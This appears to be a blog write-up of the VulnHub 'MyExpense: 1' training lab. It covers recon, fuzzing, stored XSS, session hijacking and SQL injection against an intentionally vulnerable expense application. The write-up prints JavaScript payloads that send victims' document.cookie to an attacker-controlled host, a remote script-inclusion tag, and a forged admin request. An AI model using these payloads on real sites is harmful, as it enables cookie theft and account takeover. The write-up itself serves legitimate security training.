---
layout: single
title: "VulnHub - MyExpense: 1"
excerpt: MyExpense is a deliberately vulnerable web application that allows you to train in detecting and exploiting different web vulnerabilities. Unlike a more traditional "challenge" application (which allows you to train on a single specific vulnerability), MyExpense contains a set of vulnerabilities you need to exploit to achieve the whole scenario.
date: 2025-10-08
classes: wide
header:
  teaser: /assets/images/vh.png
  teaser_home_page: true
categories:
  - vulnhub
  - easy
  - linux 
tags:
  - xss
  - sqli
  - xsrf
  - brute-force
---
# Introduction
-------------
This writeup documents the penetration testing of the [**MyExpense: 1**](https://www.vulnhub.com/entry/myexpense-1,405/) machine. This machine has been downloaded from the [**VulnHub**](https://vulnhub.com) platform.

You are Samuel Lamotte and you have been fired from **Futura Business Informatique**. The company owes you €750, but you were fired. Right now, you are in your car in front of the company. Furthermore, you are on the company's internal network with your laptop. Your login credentials before being fired were **samuel:fzghn4lw**. 

Your mission will be to compromise the company's security in order to authorize the payment they owe you.

# Recon
------------------
## Enumeration of exposed services
----------------
First, we need to discover the IP of the MyExpense machine.

![](/assets/images/vh-myexpense/arp-scan.png)

Once we identify the victim machine it would be optimal to use **settarget** to set the target IP in the Polybar.

Usually, if the machine returns a TTL of 64 it's a Linux machine. If it returns a TTL of 128 it's a Windows machine. We can also use the util [**whichSystem**](https://github.com/Akronox/WichSystem.py). 

![](/assets/images/vh-myexpense/whichSystem.png)

Now we will perform a port scan on the machine. To work in an organized way we will use the function **mkt**.

![](/assets/images/vh-myexpense/mkt.png)

![](/assets/images/vh-myexpense/nmap_scan.png)

![](/assets/images/vh-myexpense/extractPorts.png)

![](/assets/images/vh-myexpense/targeted1.png)

![](/assets/images/vh-myexpense/targeted2.png)

We can see some ports open. The most interesting port is the 80 port. Once we have scanned all ports of the machine it's good to know the Debian codename behind the system, we need to Google the Apache version reported by nmap followed by '**launchpad**'.

![](/assets/images/vh-myexpense/launchpad.png)

We are facing a **Debian Stretch**.

## Web service enumeration
------------
Once the OS and exposed services have been enumerated it's time to enumerate the web server running on the port 80.

![](/assets/images/vh-myexpense/whatweb.png)

![](/assets/images/vh-myexpense/web.png)

![](/assets/images/vh-myexpense/wappalyzer.png)

As we know, we are facing a Debian Stretch machine running in the 80 port a web page with Apache and PHP.

## Fuzzing and file enumeration
-------------
We will apply brute force to the website to list directories and files. Once the attack finished, these were the results obtained:

![](/assets/images/vh-myexpense/gobuster1.png)

It detected several directories, among them it appears the admin panel at /admin. We will enumerate that directory, since accessing it returns **Error 403 - Forbidden**.

![](/assets/images/vh-myexpense/gobuster2.png)

We found a file 'admin.php' which we will access. We have an interesting table. We discover that our user is not samuel, but **slamotte**, and our account is currently disabled.

![](/assets/images/vh-myexpense/admin.php.png)


# Exploitation
-----------
## Identification and exploitation of vulnerabilities
------------
We will attempt to register a new account. After filling in the fields we notice the button is disabled; as simple as accessing the source code and removing the 'disabled' attribute from the button.

![](/assets/images/vh-myexpense/register.png)

If we look at the admin.php file we will see that the new account has been created but is disabled. So we will try to inject JavaScript when creating another account by placing a simple alert in 'Firstname' and another in 'Lastname' to see if it is vulnerable to XSS. If we access admin/admin.php it is interpreted correctly.

![](/assets/images/vh-myexpense/alert.png)

We will launch the following payload when creating a user:

![](/assets/images/vh-myexpense/pwned.js.png)

If we set up an HTTP server on port 80 with python3, we will notice that there is a user loading admin.php from time to time. We will load a payload in pwned.js to be executed by the victim and then, steal their session cookie.

![](/assets/images/vh-myexpense/stolen_cookie.png)

```js
var request = new XMLHttpRequest();
  request.open('GET', 'http://192.168.0.139/?cookie=' + document.cookie);
  request.send();
```

Once we obtain the user's session cookie we will inject it into our browser. It seems the user in question is an administrator, since when injecting it an error appears saying that an administrator user cannot be connected in two sessions.

Therefore, we will take advantage of this administrator user so that they perform the request I was going to make, which was to activate my user account.

```js
var request = new XMLHttpRequest();
  request.open('GET', 'http://192.168.0.126/admin/admin.php?id=11&status=active');
  request.send();
```

Once we access the site as slamotte, we must submit the expense report so that someone approves it.

![](/assets/images/vh-myexpense/750_sending.png)

In the information about my account we will see that I have a manager called Manon Riviere whom we can look up in admin.php. Also, we see there are several '**financial approvers**'. The most logical approach will be to trigger an XSS in the chat to steal cookies and, with luck, one will belong to a '**financial approver**'.

```js
var request = new XMLHttpRequest();
  request.open('GET', 'http://192.168.0.139:4646/?cookie=' + document.cookie);
  request.send();
```

We will listen on port 4646 and we will inject a message that contains:

```js
<script src="http://192.168.0.131:4646/pwned.js"></script>
```

![](/assets/images/vh-myexpense/user_cookies.png)

Once we receive requests, we will check them one by one until we first find Manon Riviere's (the account from which we will accept the payment). After that, we will go for Paul Baudouin who is my manager and also a financial approver and we will hijack his session.

![](/assets/images/vh-myexpense/manon_riviere_accepts.png)

The **Rennes** panel is vulnerable to **SQLI**. We will follow the following exploitation:

![](/assets/images/vh-myexpense/sqli1.png)

![](/assets/images/vh-myexpense/sqli2.png)

![](/assets/images/vh-myexpense/sqli3.png)

![](/assets/images/vh-myexpense/sqli4.png)

Finally, we obtain a string of users and passwords. We will format it with nvim to make it more readable.

![](/assets/images/vh-myexpense/hashes.png)

## Final exploitation
-----------------
To finish this intrusion we have to crack the hash of our target pbaudouin. We will do it online: [**https://hashes.com**](https://hashes.com)

![](/assets/images/vh-myexpense/cracked_hash.png)

To finish, we will log in as pbaudouin and send ourselves the €750.

![](/assets/images/vh-myexpense/expense_reports.png)

To obtain the flag we must log in as slamotte.

![](/assets/images/vh-myexpense/flag.png)
